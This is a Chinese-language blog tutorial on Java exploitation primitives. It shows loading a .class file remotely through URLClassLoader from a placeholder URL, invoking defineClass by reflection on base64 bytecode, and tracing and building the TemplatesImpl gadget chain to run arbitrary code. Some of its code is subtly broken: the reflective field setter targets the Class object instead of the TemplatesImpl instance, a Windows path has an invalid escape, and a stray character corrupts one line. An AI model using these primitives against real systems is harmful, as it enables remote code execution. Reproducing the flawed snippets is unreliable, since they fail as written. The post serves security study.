<h3 id="远程加载-class-⽂件"><a href="#远程加载-class-⽂件" class="headerlink" title="远程加载 .class ⽂件"></a>远程加载 .class ⽂件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL; </span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urlclassloader</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlclassloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://url:port/&quot;</span>)&#125;); </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlclassloader.loadClass(<span class="string">&quot;Test&quot;</span>); c.newInstance(); &#125; &#125; </span><br></pre></td></tr></table></figure>

<p>加载到的 .class ⽂件会执⾏其字节码 当能够控制⽬标Java ClassLoader的基础路径为⼀个http服务器，则可以⽤远程加载的⽅式执⾏任意代码</p>
<h3 id="利用defineClass直接加载字节码"><a href="#利用defineClass直接加载字节码" class="headerlink" title="利用defineClass直接加载字节码"></a>利用defineClass直接加载字节码</h3><p>Java加载都需要经过：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader.loadClass -&gt; ClassLoader.findClass -&gt; ClassLoader.defineClass</span><br></pre></td></tr></table></figure>

<ul>
<li>loadClass的作⽤是从已经加载的类缓存、⽗加载器等位置寻找类（双亲委派机制），在前⾯没有找到的情况下，执⾏findClass </li>
<li>findClass的作⽤就是根据基础URL制定的⽅式来查找类，读取字节码后交给defineClass</li>
</ul>
<p>defineClass的作⽤是处理前⾯传⼊的字节码，将其处理成真正的Java类</p>
<p>所以真正核心的部分其实是 <code>defineClass</code></p>
<p>至于再具体的<code>defineClass()</code>方法是如何实现的，就要跟到这个native(本地)方法了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">native</span>方法称为本地方法。在java源程序中以关键字“<span class="keyword">native</span>”声明，不提供函数体。</span><br><span class="line">其实现使用C/C++语言在另外的文件中编写，编写的规则遵循Java本地接口的规范(简称JNI)。</span><br><span class="line">简而言就是Java中声明的可调用的使用C/C++实现的方法。</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,ProtectionDomain protectionDomain)	<span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">		....</span><br><span class="line">        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">        postDefineClass(c, protectionDomain);</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">8private <span class="keyword">native</span> Class&lt;?&gt; defineClass1(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,ProtectionDomain pd, String source);</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.gk0d;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code,<span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ClassLoader.getSystemClassLoader()返回系统的类加载器对象</span></span><br></pre></td></tr></table></figure>

<p>里面是<code>Hello.class</code>的base64编码</p>
<p>注意：在 <code>defineClass</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造<br>函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。详细可以看类的加载过程</p>
<p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
<p>还可以用IO进行文件读取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class,<span class="type">byte</span>[].class,<span class="type">int</span>.class,<span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\Exec.class&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">Exec</span> <span class="operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;Exec&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        Exec.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h1><p><code>defineClass</code>方法并不好直接利用，但是Java底层还是有一些类用到了它，这就是 <code>TemplatesImpl</code> ,<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。所以也就是说这里的<code>defineClass</code> 由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。</p>
<p>从 <code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransletClassLoader#defineClass() </span><br><span class="line">-&gt; TemplatesImpl#defineTransletClasses() </span><br><span class="line">-&gt; TemplatesImpl#getTransletInstance() </span><br><span class="line">-&gt; TemplatesImpl#newTransformer() </span><br><span class="line">-&gt; TemplatesImpl#getOutputProperties()<span class="comment">//后面提到</span></span><br></pre></td></tr></table></figure>

<p>重点来了怎么利用defineClass() 的呢怎么找的的</p>
<p>搜索defineClass() 发现在defineTransletClasses() 中调用了</p>
<p>看<code>TemplatesImpl#defineTransletClasses()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;<span class="comment">//记住这个条件</span></span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="comment">//在这里调用了defineClass</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">	_class[i] = loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>这⾥的<code>_bytecodes</code>定义是私有的也没其他搜索也没其他方法修改他，所以，可利⽤反射获取变量进⾏修改 还需要注意，defineTransletClasses⽅法中会执⾏⼀个run⽅法,为了防止报错所以_tfactory不能为空还得为TransformerFactoryImpl对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>继续看哪里用了这个defineTransletClasses() 方法,搜索发现有三个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一个</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//第二个</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//第三个</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)                   _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第一个方法为public可以直接调用  之后再说</p>
<p>第二个方法为私有所以往上调看看什么能用它,没有,那没办了</p>
<p>第三方法往上调用发现newTransformer()是个public可以调用了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);<span class="comment">//在这里</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以实例化TemplatesImpl对象直接调用它的方法就能弹计算器了</p>
<p>找到链子了所以跟进去看看条件是什么,方便就直接写进入方法前的代码块了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// newTransformer()方法中进入下一个方法并不需要条件继续</span></span><br><span class="line">&#123;            </span><br><span class="line">		TransformerImpl transformer;</span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,_indentNumber, _tfactory);&#125;</span><br><span class="line">        </span><br><span class="line">getTransletInstance()方法</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//name不能为null</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"><span class="comment">// 所以这里_class==null才行           继续跟进</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"><span class="comment">//发现在这里需要一个条件_tfactory前面说过的</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">                <span class="comment">//虽然到这就结束了</span></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="comment">//之后的会说这里要求class是AbstractTranslet的子类之后说</span></span><br></pre></td></tr></table></figure>

<p>问题是怎么控制这些变量，发现都是私有类,且没有构造方法,所以只能用反射了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>所以构造</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不用运行,理解下,为什么之后说</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Base64.getDecoder().decode(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">mpl</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> mpl.getClass();</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        mpl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Class a,String name,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> a.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(a,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可是之前那样这样只是加载了字节码并不会初始化怎么办，就像之前提到过一样</p>
<p>在getTransletInstance()方法中运行了defineTransletClasses()之后会newInstance();还是要这里的实例化才有用,就是这里就能触发我们之前加载的字节码了(所以为什么不跟进那个public方法一样因为不会初始化出来)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">     <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">         <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">         <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">              _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">         <span class="comment">//_class[_transletIndex]所以这个必须得有</span></span><br></pre></td></tr></table></figure>

<p>所以要确保进入defineTransletClasses()并不会报错所以得看完defineTransletClasses()里面写的什么,这里函数之前分析过的不再分析了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//说过_class[_transletIndex]这个必须要有才能实例化,先看确保进入方法是对的再说不然会出问题</span></span><br><span class="line"> <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">       _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">			<span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br><span class="line">               就是说的</span><br><span class="line">               <span class="keyword">else</span> &#123;</span><br><span class="line">                   _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

